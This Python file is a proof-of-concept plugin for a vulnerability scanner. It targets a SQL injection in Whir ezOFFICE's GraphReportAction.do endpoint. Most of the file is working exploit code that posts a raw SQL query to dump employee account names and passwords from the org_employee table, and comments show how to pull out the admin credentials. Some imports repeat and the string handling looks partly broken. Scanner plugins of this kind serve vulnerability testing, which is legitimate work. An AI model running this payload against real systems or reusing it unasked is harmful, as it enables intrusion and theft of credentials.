# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse
import urllib.request
import urllib.parse
import urllib.error

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Whir_0101'  # 平台漏洞编号，留空
    name = '万户ezOFFICE /defaultroot/GraphReportAction.do SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-25'  # 漏洞公布时间
    desc = '''
        万户软件是一个坚持网络风格是最大限度提升软件健壮性的一种有效手段，因为这样一来，决定应用并发数的并不是软件平台本身，而是硬件和网络速度；也就是说，从理论上讲，类似万户协同ezOFFICE这样的软件平台没有严格的并发数限制。
        万户ezOFFICE  /defaultroot/GraphReportAction.do SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=064324'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c10c8298-44b5-427b-bab2-7e9232cad6ea'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def post(self, url, data):
        req = urllib.request.Request(url)
        data = urllib.parse.urlencode(data)
        # enable cookie
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor())
        response = opener.open(req, data)
        return str(response.read())

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_path = "/defaultroot/GraphReportAction.do?action=showResult"
            verify_url = self.target + file_path
            reinfo = '<textarea name="dataSQL" rows="5" style="width:100%" readonly></textarea>'
            response = urllib.request.urlopen(verify_url).read()
            match_hash = re.compile(reinfo)
            form_hash = match_hash.findall(response)
            if not form_hash:
                return
            # execution sql
            payload = {
                'dataSQL': 'select USERACCOUNTS,USERPASSWORD from org_employee where EMP_ID=0'}
            response = self.post(verify_url, payload)
            match_hash = re.compile('<td class="listTableLine2">.*?</td>')
            form_hash = match_hash.findall(response)
            if len(form_hash) != 2:
                return

            # get admin user and password
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))
            # Admin-username= form_hash[0][form_hash[0].find('">') + 2:].rstrip('</td>')
            # Admin-password = form_hash[1][form_hash[0].find('">') + 2:].rstrip('</td>')

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
